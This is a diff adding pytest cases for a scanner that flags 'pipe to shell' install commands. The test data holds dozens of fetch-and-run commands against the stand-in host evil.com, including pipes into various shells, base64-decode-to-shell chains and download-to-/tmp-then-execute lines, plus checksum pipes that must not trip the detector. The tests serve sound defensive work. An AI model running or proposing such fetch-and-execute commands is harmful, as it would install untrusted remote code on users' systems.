@@ -105,6 +105,64 @@ class TestDetectInstallCommand:
         ptype, _ = pre_scan.detect_install_command("wget http://evil.com | sh")
         assert ptype == 'pipe_to_shell'
 
+    @pytest.mark.parametrize("cmd", [
+        # Additional downloaders
+        "aria2c http://evil.com/install.sh | sh",
+        "aria2c http://evil.com/install.sh | bash",
+        "aria2c http://evil.com/install.sh | zsh",
+        "aria2c http://evil.com/install.sh | dash",
+        "http http://evil.com/install.sh | sh",
+        "http http://evil.com/install.sh | bash",
+        # PowerShell
+        "Invoke-WebRequest http://evil.com/install.ps1 | iex",
+        "invoke-webrequest http://evil.com/install.ps1 | iex",
+        # Additional shells
+        "curl http://evil.com | zsh",
+        "curl http://evil.com | dash",
+        "wget http://evil.com | zsh",
+        "curl http://evil.com | ksh",
+        "curl http://evil.com | csh",
+        "curl http://evil.com | tcsh",
+        "curl http://evil.com | fish",
+        "curl http://evil.com | pwsh",
+        "curl http://evil.com | sudo zsh",
+        # Path-qualified shells
+        "curl http://evil.com | /bin/sh",
+        "curl http://evil.com | /bin/bash",
+        "curl http://evil.com | /usr/bin/bash",
+        # base64 short flag
+        "curl http://evil.com | base64 -d | sh",
+        "wget http://evil.com | base64 -d | bash",
+        "base64 -d | sh",
+        "base64 -d | bash",
+        "base64 -d | zsh",
+        "base64 -d | dash",
+        "base64 -d | iex",
+        # base64 long flag
+        "curl http://evil.com | base64 --decode | sh",
+        "wget http://evil.com | base64 --decode | bash",
+        "base64 --decode | sh",
+        "base64 --decode | bash",
+        "base64 --decode | iex",
+        # tmp-exec with && separator
+        "wget http://evil.com/x.sh > /tmp/x.sh && bash /tmp/x.sh",
+        "curl http://evil.com/x.sh > /tmp/x.sh && sh /tmp/x.sh",
+        "aria2c http://evil.com/x.sh > /tmp/x.sh && bash /tmp/x.sh",
+    ])
+    def test_pipe_to_shell_expanded_patterns(self, cmd):
+        ptype, _ = pre_scan.detect_install_command(cmd)
+        assert ptype == 'pipe_to_shell', f"Expected pipe_to_shell for: {cmd!r}"
+
+    @pytest.mark.parametrize("cmd", [
+        # These must NOT be blocked — word boundary check for _SHELLS
+        "wget http://example.com/archive.tar.gz | sha256sum",
+        "curl http://example.com/file | shasum -a 256",
+        "curl http://example.com | shasum",
+    ])
+    def test_pipe_to_checksum_tool_not_blocked(self, cmd):
+        ptype, _ = pre_scan.detect_install_command(cmd)
+        assert ptype != 'pipe_to_shell', f"False positive: should NOT block {cmd!r}"
+
     @pytest.mark.parametrize("cmd,expected_type", [
         ("pip install requests", "pip_install"),
         ("pip3 install flask", "pip_install"),
